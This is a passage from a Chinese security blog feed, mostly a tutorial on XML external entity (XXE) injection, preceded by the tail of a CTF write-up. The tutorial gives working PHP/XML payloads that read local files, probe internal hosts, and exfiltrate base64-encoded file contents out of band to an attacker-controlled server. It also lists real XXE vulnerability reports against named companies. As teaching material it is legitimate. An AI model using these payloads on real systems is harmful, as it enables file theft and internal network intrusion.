tjctf&#123;wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="1534253889627.png" alt="1534253889627"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1534248479004.png&quot; alt=&quot;1534248479004&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÈÄöËøáncËøûÊé•&lt;code&gt;problem1.tjctf.org:8004&lt;/code&gt; ,È¢òÁõÆÊèê‰æõ‰∏Ä‰∏™Python‰∫§‰∫íÁªàÁ´Ø„ÄÇ&lt;/p&gt;
&lt;p&gt;Ê†πÊçÆÈ¢òÁõÆÊèèËø∞ Refl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XMLÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Â∞èÁªì</title>
    <link href="https://findneo.github.io/180811-xxe-injection/"/>
    <id>https://findneo.github.io/180811-xxe-injection/</id>
    <published>2018-08-11T11:18:24.000Z</published>
    <updated>2019-01-25T23:21:37.068Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÂèëËá™ <a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">ÂÖàÁü•Á§æÂå∫</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§Ñ„ÄÇ</strong> </p><p>Ôºà Ëøô‰∏™ÈóÆÈ¢òËµÑÊñôÂæàÂ§ö‰∫ÜÔºåÁªÜËäÇ‰πüÈ¢áÂ§öÔºåÊú¨ÊñáÊ∂âÂèäÁöÑÂÜÖÂÆπÂè™ÊòØÊúÄÂü∫Êú¨ÁöÑÔºåÊèèËø∞Âæó‰πüÈöæÊØî‰ª•ÂæÄÁöÑÂ•ΩÔºå‰ªÖ‰ªÖÊòØËÆ∞ÂΩïÊâÄÂ≠¶„ÄÇÂØπ‰∫éÂ∑≤ÁªèÁêÜËß£XXEÂü∫Êú¨ÊÉÖÂÜµÁöÑËØªËÄÖÔºåÈòÖËØªÁúüÂÆûÊ°à‰æãÂíåÁîüÊàêÊÅ∂ÊÑèWordÊñáÊ°£‰∏§ÈÉ®ÂàÜÂèØËÉΩ‰ºöÊúâÊî∂Ëé∑„ÄÇÔºâ</p><h1 id="WHAT"><a href="#WHAT" class="headerlink" title="WHAT"></a>WHAT</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XMLÊòØÁ±ª‰ººHTMLÁöÑÊ†áËÆ∞ËØ≠Ë®ÄÔºå‰ΩÜÂÆÉ‰ª¨ÊúâÊâÄ‰∏çÂêå„ÄÇ</p><ul><li>ÂÖ∂‰∏ÄÔºåHTMLÁî®‰∫éË°®Áé∞Êï∞ÊçÆÔºåÂÖ≥Ê≥®Êï∞ÊçÆÁöÑË°®Áé∞ÂΩ¢ÂºèÔºåXMLÁî®‰∫éÂ≠òÂÇ®Âíå‰º†ËæìÊï∞ÊçÆÔºåÂÖ≥Ê≥®Êï∞ÊçÆÊú¨Ë∫´„ÄÇ</li><li>ÂÖ∂‰∫åÔºåHTMLÁöÑÊ†áÁ≠æÊòØÈ¢ÑÂÆö‰πâÁöÑÔºåËÄåXMLÁöÑÊ†áÁ≠æÊòØËá™ÂÆö‰πâÁöÑÔºåÊàñËÄÖËØ¥Ôºå‰ªªÊÑèÁöÑ„ÄÇ</li><li>Ê≠§Â§ñÔºåXMLËØ≠Ê≥ïÊõ¥‰∏•Ê†ºÔºåÂÖ∂Ê†áÁ≠æÂøÖÈ°ªÈó≠Âêà‰∏îÊ≠£Á°ÆÂµåÂ•óÔºåÂ§ßÂ∞èÂÜôÊïèÊÑüÔºåÂ±ûÊÄßÂÄºÂøÖÈ°ªÂä†ÂºïÂè∑Ôºå‰øùÁïôËøûÁª≠Á©∫ÁôΩÁ¨¶„ÄÇ</li><li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  Áß∞‰∏∫ <code>XML prolog</code> ÔºåÁî®‰∫éÂ£∞ÊòéXMLÊñáÊ°£ÁöÑÁâàÊú¨ÂíåÁºñÁ†ÅÔºåÊòØÂèØÈÄâÁöÑÔºåÂøÖÈ°ªÊîæÂú®ÊñáÊ°£ÂºÄÂ§¥„ÄÇstandaloneÂÄºÊòØyesÁöÑÊó∂ÂÄôË°®Á§∫DTD‰ªÖÁî®‰∫éÈ™åËØÅÊñáÊ°£ÁªìÊûÑÔºå‰ªéËÄåÂ§ñÈÉ®ÂÆû‰ΩìÂ∞ÜË¢´Á¶ÅÁî®Ôºå‰ΩÜÂÆÉÁöÑÈªòËÆ§ÂÄºÊòØnoÔºåËÄå‰∏îÊúâ‰∫õparser‰ºöÁõ¥Êé•ÂøΩÁï•Ëøô‰∏ÄÈ°π„ÄÇ</li></ul><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>XMLÂÖÉÁ¥†‰ª•ÂΩ¢Â¶Ç <code>&lt;tag&gt;foo&lt;/tag&gt;</code> ÁöÑÊ†áÁ≠æÂºÄÂßãÂíåÁªìÊùüÔºåÂ¶ÇÊûúÂÖÉÁ¥†ÂÜÖÈÉ®Âá∫Áé∞Â¶Ç<code>&lt;</code> ÁöÑÁâπÊÆäÂ≠óÁ¨¶ÔºåËß£ÊûêÂ∞±‰ºöÂ§±Ë¥•Ôºå‰∏∫‰∫ÜÈÅøÂÖçËøôÁßçÊÉÖÂÜµÔºåXMLÁî®ÂÆû‰ΩìÂºïÁî®Ôºàentity referenceÔºâÊõøÊç¢ÁâπÊÆäÂ≠óÁ¨¶„ÄÇXMLÈ¢ÑÂÆö‰πâ‰∫Ü‰∫î‰∏™ÂÆû‰ΩìÂºïÁî®ÔºåÂç≥Áî®<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> ÊõøÊç¢ <code>&lt; &gt; &amp; &#39; &quot;</code> „ÄÇ</p><p>ÂÆûÈôÖ‰∏äÔºåÂÆû‰ΩìÂºïÁî®ÂèØ‰ª•Ëµ∑Âà∞Á±ª‰ººÂÆèÂÆö‰πâÂíåÊñá‰ª∂ÂåÖÂê´ÁöÑÊïàÊûúÔºå‰∏∫‰∫ÜÊñπ‰æøÔºåÊàë‰ª¨‰ºöÂ∏åÊúõËá™ÂÆö‰πâÂÆû‰ΩìÂºïÁî®ÔºåËøô‰∏™Êìç‰ΩúÂú®Áß∞‰∏∫ Document Type DefinationÔºàDTDÔºåÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºâÁöÑËøáÁ®ã‰∏≠ËøõË°å„ÄÇDTDÊòØXMLÊñáÊ°£‰∏≠ÁöÑÂá†Êù°ËØ≠Âè•ÔºåÁî®Êù•ËØ¥ÊòéÂì™‰∫õÂÖÉÁ¥†/Â±ûÊÄßÊòØÂêàÊ≥ïÁöÑ‰ª•ÂèäÂÖÉÁ¥†Èó¥Â∫îÂΩìÊÄéÊ†∑ÂµåÂ•ó/ÁªìÂêàÔºå‰πüÁî®Êù•Â∞Ü‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶ÂíåÂèØÂ§çÁî®‰ª£Á†ÅÊÆµËá™ÂÆö‰πâ‰∏∫ÂÆû‰Ωì„ÄÇ</p><p>DTDÊúâ‰∏§ÁßçÂΩ¢ÂºèÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ÂÜÖÈÉ® DTDÔºö&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [ÂÖÉÁ¥†Â£∞Êòé]&gt;</span><br><span class="line">Â§ñÈÉ® DTDÔºö</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† SYSTEM &quot;Â≠òÊîæÂÖÉÁ¥†Â£∞ÊòéÁöÑÊñá‰ª∂ÁöÑURIÔºåÂèØ‰ª•ÊòØÊú¨Âú∞Êñá‰ª∂ÊàñÁΩëÁªúÊñá‰ª∂&quot; [ÂèØÈÄâÁöÑÂÖÉÁ¥†Â£∞Êòé]&gt;</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† PUBLIC &quot;PUBLIC_ID DTDÁöÑÂêçÁß∞&quot; &quot;Â§ñÈÉ®DTDÊñá‰ª∂ÁöÑURI&quot;&gt;</span><br><span class="line">Ôºà PUBLICË°®Á§∫ DTDÊñá‰ª∂ÊòØÂÖ¨ÂÖ±ÁöÑÔºåËß£ÊûêÂô®ÂÖàÂàÜÊûê DTDÂêçÁß∞ÔºåÊ≤°Êü•Âà∞ÂÜçÂéªËÆøÈóÆ URIÔºâ</span><br></pre></td></tr></table></figure><h2 id="ENTITY"><a href="#ENTITY" class="headerlink" title="ENTITY"></a>ENTITY</h2><p>Êàë‰ª¨ÂèØ‰ª•Âú®ÂÖÉÁ¥†Â£∞Êòé‰∏≠Ëá™ÂÆö‰πâÂÆû‰ΩìÔºåÂíåDTDÁ±ª‰ºº‰πüÂàÜ‰∏∫ÂÜÖÈÉ®ÂÆû‰ΩìÂíåÂ§ñÈÉ®ÂÆû‰ΩìÔºåÊ≠§Â§ñËøòÊúâÊôÆÈÄöÂÆû‰ΩìÂíåÂèÇÊï∞ÂÆû‰Ωì‰πãÂàÜÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Â£∞ÊòéÔºö</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [&lt;!ENTITY ÂÜÖÈÉ®ÊôÆÈÄöÂÆû‰ΩìÂêç &quot;ÂÆû‰ΩìÊâÄ‰ª£Ë°®ÁöÑÂ≠óÁ¨¶‰∏≤&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [&lt;!ENTITY Â§ñÈÉ®ÊôÆÈÄöÂÆû‰ΩìÂêç SYSTEM &quot;Â§ñÈÉ®ÂÆû‰ΩìÁöÑURI&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [&lt;!ENTITY % ÂÜÖÈÉ®ÂèÇÊï∞ÂÆû‰ΩìÂêç &quot;ÂÆû‰ΩìÊâÄ‰ª£Ë°®ÁöÑÂ≠óÁ¨¶‰∏≤&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [&lt;!ENTITY % Â§ñÈÉ®ÂèÇÊï∞ÂÆû‰ΩìÂêç SYSTEM &quot;Â§ñÈÉ®ÂÆû‰ΩìÁöÑURI&quot;&gt;]&gt;</span><br><span class="line">Èô§‰∫Ü SYSTEMÂÖ≥ÈîÆÂ≠óÂ§ñÔºåÂ§ñÈÉ®ÂÆû‰ΩìËøòÂèØÁî® PUBLICÂÖ≥ÈîÆÂ≠óÂ£∞Êòé„ÄÇ</span><br><span class="line">ÂºïÁî®Ôºö</span><br><span class="line">&amp;ÊôÆÈÄöÂÆû‰ΩìÂêç; //ÁªèÂÆûÈ™åÔºåÊôÆÈÄöÂÆû‰ΩìÊó¢ÂèØ‰ª•Âú® DTD‰∏≠Ôºå‰πüÂèØ‰ª•Âú® XML‰∏≠ÂºïÁî®ÔºåÂèØ‰ª•Âú®Â£∞ÊòéÂâçÂºïÁî®ÔºåÂèØ‰ª•Âú®Âú®ÂÖÉÁ¥†Â£∞ÊòéÂÜÖÈÉ®ÂºïÁî®</span><br><span class="line">%ÂèÇÊï∞ÂÆû‰ΩìÂêç; //ÁªèÂÆûÈ™åÔºåÂèÇÊï∞ÂÆû‰ΩìÂè™ËÉΩÂú® DTD‰∏≠ÂºïÁî®Ôºå‰∏çËÉΩÂú®Â£∞ÊòéÂâçÂºïÁî®,‰∏çËÉΩÂú®ÂÖÉÁ¥†Â£∞ÊòéÂÜÖÈÉ®ÂºïÁî®</span><br></pre></td></tr></table></figure><h2 id="ÂèØËÉΩÈÄ†ÊàêÁöÑÂç±ÂÆ≥"><a href="#ÂèØËÉΩÈÄ†ÊàêÁöÑÂç±ÂÆ≥" class="headerlink" title="ÂèØËÉΩÈÄ†ÊàêÁöÑÂç±ÂÆ≥"></a>ÂèØËÉΩÈÄ†ÊàêÁöÑÂç±ÂÆ≥</h2><ul><li>Êú¨Âú∞Êñá‰ª∂ËØªÂèñ</li><li>ÂÜÖÁΩëËÆøÈóÆÔºå‰∏ªÊú∫/Á´ØÂè£Êâ´Êèè</li><li>ÁΩëÁªúËÆøÈóÆ</li><li>Á≥ªÁªüÂëΩ‰ª§ÊâßË°åÔºàÁâπÂÆöÂçèËÆÆÔºåÂ¶ÇPHPÁöÑexpectÔºâ</li><li>ÊãíÁªùÊúçÂä°ÔºàÂµåÂ•óÂºïÁî®ÔºåÊåáÊï∞ÁàÜÁÇ∏Ôºâ</li></ul><h1 id="HOW"><a href="#HOW" class="headerlink" title="HOW"></a>HOW</h1><p>URIÊîØÊåÅÁöÑÂçèËÆÆÔºö</p><p><img src="1534066968195.png" alt="scheme support"></p><h2 id="Âà©Áî®ÂºïÁî®Â§ñÈÉ®DTDÂèëËµ∑ÁΩëÁªúËØ∑Ê±Ç"><a href="#Âà©Áî®ÂºïÁî®Â§ñÈÉ®DTDÂèëËµ∑ÁΩëÁªúËØ∑Ê±Ç" class="headerlink" title="Âà©Áî®ÂºïÁî®Â§ñÈÉ®DTDÂèëËµ∑ÁΩëÁªúËØ∑Ê±Ç"></a>Âà©Áî®ÂºïÁî®Â§ñÈÉ®DTDÂèëËµ∑ÁΩëÁªúËØ∑Ê±Ç</h2><p><code>test.php</code> ‰ΩøÁî®Â§ñÈÉ®DTDÂØπXMLËøõË°åÈ™åËØÅÔºåÂ¶ÇÊûúXMLÂèØ‰ª•Ê≥®ÂÖ•‰∏îDTDÁöÑURIÂèØÊéßÔºåÂ∞±ÊúâÂèëËµ∑ÁΩëÁªúËØ∑Ê±ÇÁöÑÂèØËÉΩ„ÄÇÂú®<code>192.168.1.2:80</code> ÊúâWebÊúçÂä°ËÄå<code>192.168.1.3:80</code> Ê≤°ÊúâÔºåDTDÁöÑURI‰∏çÂêåÊó∂ËÆøÈóÆ <code>test.php</code> Â∞±‰ºöÂæóÂà∞‰∏çÂêåÁöÑÂìçÂ∫î„ÄÇ</p><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$dom-&gt;load(<span class="string">'with_external_dtd.xml'</span>);</span><br><span class="line"><span class="keyword">if</span> ($dom-&gt;validate()) &#123;<span class="keyword">echo</span> <span class="string">"validated!\n"</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"invalid!\n"</span>;</span><br></pre></td></tr></table></figure><p>with_external_dtd.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ÂæàÂø´ËøîÂõû validated! --&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE note SYSTEM "external_dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ÂæàÂø´ËøîÂõû invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.2/"&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ÂæàÈïø‰∏ÄÊÆµÊó∂Èó¥ÊâçËøîÂõû invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM "http://192.168.1.3/"&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>Valar Morghulis<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>external_dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="Âà©Áî®ÊôÆÈÄöXXEËØªÂèñÊñá‰ª∂-ËÆøÈóÆÁΩëÁªú"><a href="#Âà©Áî®ÊôÆÈÄöXXEËØªÂèñÊñá‰ª∂-ËÆøÈóÆÁΩëÁªú" class="headerlink" title="Âà©Áî®ÊôÆÈÄöXXEËØªÂèñÊñá‰ª∂/ËÆøÈóÆÁΩëÁªú"></a>Âà©Áî®ÊôÆÈÄöXXEËØªÂèñÊñá‰ª∂/ËÆøÈóÆÁΩëÁªú</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM "file:///C:/Windows/win.ini"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br></pre></td></tr></table></figure><h2 id="Âà©Áî®ÂèÇÊï∞XXEËØªÂèñÊñá‰ª∂-ËÆøÈóÆÁΩëÁªú"><a href="#Âà©Áî®ÂèÇÊï∞XXEËØªÂèñÊñá‰ª∂-ËÆøÈóÆÁΩëÁªú" class="headerlink" title="Âà©Áî®ÂèÇÊï∞XXEËØªÂèñÊñá‰ª∂/ËÆøÈóÆÁΩëÁªú"></a>Âà©Áî®ÂèÇÊï∞XXEËØªÂèñÊñá‰ª∂/ËÆøÈóÆÁΩëÁªú</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM "http://127.0.0.1:8088/evil.txt"&gt;%b;]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;d;&lt;/c&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string($s);</span><br><span class="line"><span class="comment">// evil.txt :  &lt;!ENTITY d SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE-OOB"><a href="#XXE-OOB" class="headerlink" title="XXE OOB"></a>XXE OOB</h2><p>Â¶ÇÊûúÊ≤°ÊúâÂõûÊòæ‰πüÊ≤°ÂÖ≥Á≥ªÔºåÂèØ‰ª•Âà©Áî®Â§ñÈÉ®ÂèÇÊï∞ÂÆû‰ΩìÂ∞ÜÊñá‰ª∂ÂÜÖÂÆπÂèëÈÄÅÂá∫Âéª„ÄÇËøôÈáåÊ≥®ÊÑèÂèÇÊï∞ÂÆû‰ΩìÂºïÁî® <code>%file;</code> ÂøÖÈ°ªÊîæÂú®Â§ñÈÉ®Êñá‰ª∂ÈáåÔºåÂõ†‰∏∫Ê†πÊçÆËøôÊù° <a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">ËßÑÂàô</a> ÔºåÂú®ÂÜÖÈÉ®DTDÈáåÔºå ÂèÇÊï∞ÂÆû‰ΩìÂºïÁî®Âè™ËÉΩÂíåÂÖÉÁ¥†ÂêåÁ∫ßËÄå‰∏çËÉΩÁõ¥Êé•Âá∫Áé∞Âú®ÂÖÉÁ¥†Â£∞ÊòéÂÜÖÈÉ®ÔºåÂê¶Âàôparser‰ºöÊä•ÈîôÔºö <code>PEReferences forbidden in internal subset</code> „ÄÇËøôÈáåÁöÑ<code>internal subset</code> ÊåáÁöÑÊòØ‰∏≠Êã¨Âè∑<code>[]</code> ÂÜÖÈÉ®ÁöÑ‰∏ÄÁ≥ªÂàóÂÖÉÁ¥†Â£∞ÊòéÔºå<code>PEReferences</code> ÊåáÁöÑÂ∫îËØ•ÊòØÂèÇÊï∞ÂÆû‰ΩìÂºïÁî® <code>Parameter-Entity Reference</code> „ÄÇ</p><p>ÊÑüËßâÂú®ÊäÄÊúØÊñπÈù¢Ëã±ÊñáÁöÑË°®ËææÂäõÊõ¥Âº∫ÔºåËøôÁßçÊÉÖÂÜµÂè´ÂÅö <code>fetch external parsed entities using PEReference</code> Êõ¥Â•ΩÁêÜËß£„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">&lt;&lt;&lt;string</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [&lt;!ENTITY % xxe SYSTEM "http://127.0.0.1:8088/xxe.txt"&gt; %xxe;]&gt;</span></span><br><span class="line"><span class="string">string;</span></span><br><span class="line">simplexml_load_string($s);</span><br><span class="line"><span class="comment">/* // http://127.0.0.1:8088/xxe.txt:</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:/Windows/win.ini"&gt;</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % x '&lt;!ENTITY &amp;#37; send SYSTEM "http://127.0.0.1:8088/%file;"&gt;'&gt; %x;</span></span><br><span class="line"><span class="comment">%send;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="ÁúüÂÆûÊ°à‰æã"><a href="#ÁúüÂÆûÊ°à‰æã" class="headerlink" title="ÁúüÂÆûÊ°à‰æã"></a>ÁúüÂÆûÊ°à‰æã</h1><ul><li>Âú®Á∫øÊñá‰ª∂È¢ÑËßàÂºïËµ∑ÁöÑÈóÆÈ¢òÔºå‰øÆÊîπdocxÊñá‰ª∂ÁöÑword/document.xmlÔºåÊ∑ªÂä†DTDÂíåÂÆû‰ΩìÂºïÁî®ÔºåÂç≥ÂèØËß¶Âèë„ÄÇ<ul><li>WooYun-2014-73321ÔºàÁΩëÊòìÈÇÆÁÆ±ÊüêÂ§ÑXXEÂèØËØªÂèñÊñá‰ª∂Ôºâ</li><li>WooYun-2014-73439ÔºàQQÈÇÆÁÆ±XXEÂèØËØªÂèñ‰ªªÊÑèÊñá‰ª∂Ôºâ</li><li>‚Ä¶‚Ä¶</li></ul></li><li>Áõ¥Êé•Â§ÑÁêÜPOST XMLÊï∞ÊçÆ„ÄÇWooYun-2015-109725Ôºà‰∏≠ÈÄöÊüêÂ§ÑXXEÊºèÊ¥ûÂèØËØªÂèñÊúçÂä°Âô®‰ªªÊÑèÊñá‰ª∂ÔºâÁ≠âÂæàÂ§ö„ÄÇËÆ∏Â§öÊòØÁõ¥Êé• <code>simplexml_load_string</code> Â§ÑÁêÜPOSTËøõÊù•ÁöÑÊï∞ÊçÆ„ÄÇÂèØÊéßÂ≠óÁ¨¶‰∏≤Âá∫Áé∞Âú®XMLÊñá‰ª∂ÈáåÂ∞±Ë¶ÅÂºïËµ∑Ê≥®ÊÑè„ÄÇ</li><li>XMLÂ§ÑÁêÜÂ∑•ÂÖ∑<ul><li>WooYun-2014-59911Ôºà‰ªéÂºÄÊ∫ê‰∏≠ÂõΩÁöÑÊüêXXEÊºèÊ¥ûÂà∞‰∏ªÁ´ôshellÔºâÊ†ºÂºèÂåñXML„ÄÇ</li><li>WooYun-2015-134057ÔºàÁôæÂ∫¶ÊüêÂπ≥Âè∞Blind XXEÊºèÊ¥û&amp;ÂèØBoolÂûãSSRFÊîªÂáªÔºâXMLÊ£ÄÊü•Â∑•ÂÖ∑„ÄÇ</li><li>WooYun-2015-135397ÔºàÊêúÁãóÊüêÂπ≥Âè∞Blind XXEÊºèÊ¥û(ËØªÂèñÊñá‰ª∂/SSRF/Struts2ÂëΩ‰ª§ÊâßË°å) XMLÊ£ÄÊü•Â∑•ÂÖ∑</li></ul></li><li>WooYun-2014-58381ÔºàÁôæÂ∫¶ÊüêÂäüËÉΩXMLÂÆû‰ΩìÊ≥®ÂÖ•ÔºâËØ•ÂäüËÉΩÁÇπÊèê‰æõsvgËΩ¨jpgÊúçÂä°ÔºåÈÄöËøáÊûÑÈÄ†ÁâπÊÆäsvgÊñá‰ª∂Ê≥®ÂÖ•„ÄÇ</li><li>WooYun-2014-74069ÔºàÈ≤úÊûúÁΩëRSSÂØºÂÖ•Blind XXEÊºèÊ¥û ÔºâÂØºÂÖ•OPMLÊñá‰ª∂„ÄÇ</li><li>WooYun-2015-111828ÔºàÂçöÂÆ¢Âõ≠ÊüêÂ§ÑXXEÂèØ‰∏ãËΩΩ‰ªªÊÑèÊñá‰ª∂ÔºâÂçöÂÆ¢Êê¨ÂÆ∂ÂäüËÉΩÔºåÂØºÂÖ•XML„ÄÇ</li><li>WooYun-2015-117316ÔºàÁî®Âèã‰∫∫ÂäõËµÑÊ∫êÁÆ°ÁêÜËΩØ‰ª∂ÂÖ®ÁâàÊú¨XXEÊºèÊ¥û  ÔºâÁôªÈôÜ‰∏éÈáçÁΩÆÂØÜÁ†ÅÊó∂‰ΩøÁî®XML‰º†ËæìÊï∞ÊçÆ„ÄÇ</li><li>WooYun-2015-148793ÔºàAOL Website XML External Entity(XXE) VulnerabilityÔºâxmlrpc service„ÄÇ</li><li>WooYun-2015-156208ÔºàÂõΩÈôÖphpÊ°ÜÊû∂slimÊû∂ÊûÑ‰∏äÂ≠òÂú®XXEÊºèÊ¥ûÔºàXXEÁöÑÂÖ∏ÂûãÂ≠òÂú®ÂΩ¢ÂºèÔºâÔºâÊúçÂä°Á´ØÊ†πÊçÆËØ∑Ê±ÇÁöÑ <code>content-type</code> Êù•Âå∫Âà´ÂØπÂæÖÊèê‰∫§ÁöÑÊï∞ÊçÆ„ÄÇ<code>application/x-www-form-urlencoded</code> „ÄÅ<code>application/json</code> „ÄÅ<code>application/xml</code> Ë¢´Áî®‰∏çÂêåÁöÑÊñπÂºèËß£Êûê„ÄÇXMLÁõ¥Êé•Ë∞ÉÁî® <code>simplexml_load_string</code> Â§ÑÁêÜÂØºËá¥ÊºèÊ¥û„ÄÇÊúâË∂£ÁöÑÊòØÊóßÁâàÊú¨ÂØπËØ•ÈóÆÈ¢òÂÅö‰∫ÜÈò≤ËåÉÔºåÊñ∞ÁâàÊú¨ÂéªÈô§‰∫ÜÁõ∏ÂÖ≥‰ª£Á†ÅÔºåÂèØËÉΩÊòØËßâÂæóÊñ∞ÁâàÊú¨ÂØπPHPÁâàÊú¨ÈúÄÊ±ÇÂú®5.5‰ª•‰∏ä„ÄÇÂÆûÈôÖ‰∏äPHPÊòØÂê¶Ëß£ÊûêÂ§ñÈÉ®ÂÆû‰Ωì‰∏éÊú¨Ë∫´ÁâàÊú¨Êó†ÂÖ≥Ôºå‰∏éÁºñËØëÊó∂libxmlÂ∫ìÁâàÊú¨ÊúâÂÖ≥„ÄÇ</li><li>WooYun-2016-168457ÔºàÂîØÂìÅ‰ºöÂ≠òÂú®Blind XXE ÊºèÊ¥ûÔºâ„ÄÇ‰ΩúËÄÖËØ¥ <code>ÂÖ≥‰∫éXXE,ËßâÂæóÊºèÊ¥ûÊú¨Ë∫´Ê≤°Â§™Â§öÁöÑÁé©ÁÇπÔºåÊØîËæÉÊúâÊÑèÊÄù‰∏ªË¶ÅÂú®‰∫éÔºö‰∏çÂêåËØ≠Ë®ÄÂ§ÑÁêÜURIÁöÑÂ§öÂÖÉÂåñÂíå‰∏çÂêåXMLËß£ÊûêÂô®Âú®Ëß£ÊûêXMLÁöÑ‰∏Ä‰∫õÁâπÊÄß„ÄÇ</code> ÔºåÊàëËßâÂæóÊúâÈÅìÁêÜ„ÄÇ<code>xfireÊòØÊµÅË°åÁöÑwebserviceÂºÄÂèëÁªÑ‰ª∂ÔºåÂÖ∂Âú®invokeÊó∂‰ΩøÁî®‰∫ÜSTAXËß£ÊûêXMLÂØºËá¥XMLÂÆû‰ΩìÊ≥®ÂÖ•ÂèëÁîü</code> „ÄÇ‰πå‰∫ë‰∏ä‰∏ÄÂ§ßÊ≥¢XXEÊ¥ûÈÉΩÊòØËøô‰∏™ÔºåËØ¶ÁªÜËØ¥ÊòéËßÅ WooYun-2016-166751(XfireÊñá‰ª∂ËØªÂèñÊºèÊ¥û)„ÄÇ</li><li>WooYun-2014-59911Ôºà‰ªéÂºÄÊ∫ê‰∏≠ÂõΩÁöÑÊüêXXEÊºèÊ¥ûÂà∞‰∏ªÁ´ôshellÔºâXXEËØªÂèñÂà∞ËÑöÊú¨Êñá‰ª∂<code>/home/run/ssh_go.sh</code> 